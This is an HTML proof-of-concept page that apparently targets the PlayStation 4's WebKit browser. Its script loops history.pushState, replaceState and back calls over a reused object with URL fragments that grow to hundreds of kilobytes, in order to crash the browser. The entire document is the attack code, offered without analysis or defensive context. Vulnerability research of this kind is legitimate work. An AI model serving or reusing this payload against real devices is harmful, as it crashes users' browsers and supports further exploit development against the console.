
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit History Crash PoC</title>
<style>
body { background:#000; color:#0f0; font-family: monospace; }
#log { white-space: pre; }
button { padding:10px; margin:10px; }
</style>
</head>

<body>

<h3>PS4 WebKit â€“ History.pushState Crash PoC</h3>
<button onclick="run()">RUN</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m) { logEl.textContent += m + "\n"; }

function run() {
    log("[START]");
    
    let base = {};
    let size = 977;

    for (let i = 0; i < 50; i++) {
        log(`[ITER ${i}] size=${size}`);

        // fragment grows monotonically
        let payload = "A".repeat(size);

        // same object reused (critical)
        base.i = i;
        base.p = payload;

        // core pressure sequence
        history.pushState(base, "", "#" + payload);
        history.replaceState(base, "", "#" + payload.slice(0, payload.length >> 1));

        // synchronous back pressure
        if ((i % 5) === 0) {
            history.back();
        }

        size += 14461;
    }

    log("[END]");
}

log("[READY]");
</script>

</body>
</html>
